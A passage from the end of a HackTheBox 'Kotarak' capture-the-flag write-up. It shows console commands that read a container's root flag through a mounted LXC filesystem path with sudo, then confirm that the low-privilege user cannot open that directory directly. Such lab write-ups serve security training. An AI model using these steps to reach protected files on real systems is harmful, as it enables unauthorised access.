+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">ls</span> /mnt/root/
+<span class="go">app.log  flag.txt
+</span></code></pre></div></div>
+<p>The containers keep their file system mounted in <code class="language-plaintext highlighter-rouge">/var/lib/lxc/</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo cat</span> /mnt/var/lib/lxc/kotarak-int/rootfs/root/root.txt
+<span class="go">950d1425************************
+</span></code></pre></div></div>
+<p>I can verify that as atanas I can’t just access that directory directly:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-ld</span> /var/lib/lxc
+<span class="go">drwx------ 3 root root 4096 Jul 21  2017 /var/lib/lxc
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2021/05/19/htb-kotarak.html"></a>
+</article>
